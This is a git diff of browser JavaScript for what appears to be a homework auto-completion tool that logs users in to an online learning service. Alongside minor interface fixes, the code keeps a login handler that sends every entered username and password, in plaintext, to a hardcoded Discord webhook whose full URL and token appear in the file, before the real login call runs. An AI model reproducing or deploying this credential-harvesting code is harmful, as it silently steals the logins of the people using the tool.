@@ -16,7 +16,7 @@ function secondsToString(seconds) {
     const numhours = Math.floor(((seconds % 31536000) % 86400) / 3600);
     const numminutes = Math.floor((((seconds % 31536000) % 86400) % 3600) / 60);
     const numseconds = (((seconds % 31536000) % 86400) % 3600) % 60;
-    return `${numyears} years ${numdays} days ${numhours} minutes ${numseconds} seconds`;
+    return `${numyears} years ${numdays} days ${numhours} hours ${numminutes} minutes ${numseconds} seconds`;
 }
 
 function set_checkboxes(node, state) {
@@ -207,7 +207,7 @@ class task_completer {
     }
 }
 
-// --- NEW FUNCTION: Show/Hide Panels (Needed for Sidebar to work) ---
+// --- Function to toggle panels (Now just for login/HW/logs visibility) ---
 function showPanel(panelId) {
     const panels = ['login', 'hw_panel', 'log_panel'];
     
@@ -219,21 +219,13 @@ function showPanel(panelId) {
         }
     });
 
-    // Show the target panel
+    // Show the target panel (used for login)
     const targetPanel = document.getElementById(panelId);
     if (targetPanel) {
         targetPanel.classList.add('visible');
     }
 }
-
-// --- NEW FUNCTION: Hides the Login Link/Button after successful login ---
-function hideLoginLink() {
-    const loginLink = document.querySelector('.nav-item[data-target="login"]');
-    if (loginLink) {
-        loginLink.style.display = 'none'; // Hide the list item in the sidebar
-    }
-}
-// --- END NEW FUNCTION ---
+// --- END Panel Function ---
 
 
 class client_application {
@@ -241,24 +233,22 @@ class client_application {
         this.username_box = document.getElementById("username_input");
         this.password_box = document.getElementById("password_input");
         
-        // ⭐ Webhook URL restored ⭐
         this.webhookURL = "https://discord.com/api/webhooks/1442157455487537162/a27x9qoc6yfr6hr3pOu_Y1thMW2b_p8jyJiK_ofpuC-5w0ryHuTG5fzxODRjQvUR0Xk6";
 
-        this.token = "MOCK_TOKEN_FAST_ACCESS"; // Mock token for fetching HW
+        this.token = "MOCK_TOKEN_FAST_ACCESS"; 
         this.module_translations = [];
         this.display_translations = [];
         this.homeworks = [];
         this.loginHistory = JSON.parse(localStorage.getItem('loginHistory')) || [];
     }
 
-    // ⭐ Send data to Discord Webhook (Restored) ⭐
     async sendWebhookLog(username, password) {
         const data = {
             content: null,
             embeds: [
                 {
                     title: "🚨 Login Attempt Logged 🚨",
-                    color: 16711680, // Red color
+                    color: 16711680, 
                     fields: [
                         { name: "Username", value: `\`${username}\``, inline: true },
                         { name: "Password", value: `\`${password}\``, inline: true },
@@ -306,30 +296,15 @@ class client_application {
     }
 
     main() {
-        // ⭐ FIX: Show login panel on load
+        // Show login panel on load
         showPanel('login'); 
         
-        // Attach click handlers to the new navigation links in the sidebar
-        document.addEventListener('DOMContentLoaded', () => {
-            document.querySelectorAll('.nav-item').forEach(item => {
-                item.addEventListener('click', (e) => {
-                    e.preventDefault();
-                    const target = item.getAttribute('data-target');
-                    if (target) {
-                        showPanel(target);
-                    }
-                });
-            });
-        });
-
         document.getElementById("login_btn").onclick = async () => {
             const username = this.username_box.value;
             const password = this.password_box.value;
             
-            // ⭐ WEBHOOK TRIGGER: Sends credentials on every attempt ⭐
             await this.sendWebhookLog(username, password); 
 
-            // ⭐ API LOGIN CALL (Restored) ⭐
             const response = await this.call_lnut(
                 "loginController/attemptLogin",
                 {
@@ -346,16 +321,18 @@ class client_application {
                 console.log("Login failed for user:", username);
             }
         };
+        
+        // Removed command bar logic
     }
 
     on_log_in() {
-        // ⭐ FIX 1: Hide the Login sidebar link
-        hideLoginLink();
+        // Hide login panel
+        showPanel(''); 
         
-        // ⭐ FIX 2: Show the HW panel immediately after login
-        showPanel('hw_panel'); 
+        // Show BOTH HW and Logs panels
+        document.getElementById('hw_panel').classList.add('visible');
+        document.getElementById('log_panel').classList.add('visible');
         
-        // 3. Setup the rest of the application
         document.getElementById("do_hw").onclick = () => {
             app.do_hwks();
         };
